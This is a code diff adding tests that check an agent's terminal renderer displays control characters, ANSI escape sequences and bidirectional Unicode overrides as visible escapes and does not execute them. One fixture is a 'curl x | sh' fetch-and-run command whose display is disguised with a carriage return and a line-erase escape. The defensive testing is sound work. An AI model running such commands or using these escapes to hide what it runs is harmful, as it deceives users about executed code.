@@ -148,3 +148,48 @@ describe("Renderer: how the turn ended", () => {
     expect(renderer.render({ type: "text_delta", text: "Second." })).toBe("Second.");
   });
 });
+
+// Spec requirement "Control characters are shown, not obeyed": a terminal
+// executes escape sequences, so text from the model or a tool must reach it
+// as visible characters, never as commands.
+describe("Renderer: control characters", () => {
+  it("shows an escape sequence in streamed text instead of sending it", () => {
+    // ESC[2J would clear the screen.
+    expect(renderAll({ type: "text_delta", text: "a\x1b[2Jb" })).toBe("a\\x1b[2Jb");
+  });
+
+  it("shows a carriage return and an escape in a tool line", () => {
+    expect(
+      renderAll({
+        type: "tool_started",
+        call: call("bash", { command: "curl x | sh\r\x1b[2Kls" }),
+      }),
+    ).toBe("→ bash: curl x | sh\\r\\x1b[2Kls\n");
+  });
+
+  it("shows control characters in a tool's error line and a provider's error", () => {
+    expect(renderAll(finished("bash", "bad\x07 bell", true))).toBe("  ✗ bad\\x07 bell\n");
+    expect(
+      renderAll({
+        type: "turn_ended",
+        reason: "failed",
+        error: new ProviderError("protocol", "oops\x1b[1A"),
+        conversation: [],
+      }),
+    ).toBe("[error (protocol): oops\\x1b[1A]\n");
+  });
+
+  // Unicode can reverse the order text is displayed in ("Trojan Source"),
+  // which would let a command read differently from what runs.
+  it("shows bidirectional overrides as escapes", () => {
+    expect(renderAll({ type: "text_delta", text: "a‮b⁦c" })).toBe("a\\u202eb\\u2066c");
+  });
+
+  it("keeps newlines, tabs and Windows line endings as they are", () => {
+    expect(renderAll({ type: "text_delta", text: "a\tb\nc\r\nd" })).toBe("a\tb\nc\r\nd");
+  });
+
+  it("doesn't leave a Windows line ending's carriage return in a tool's error line", () => {
+    expect(renderAll(finished("bash", "failed\r\nmore", true))).toBe("  ✗ failed\n");
+  });
+});
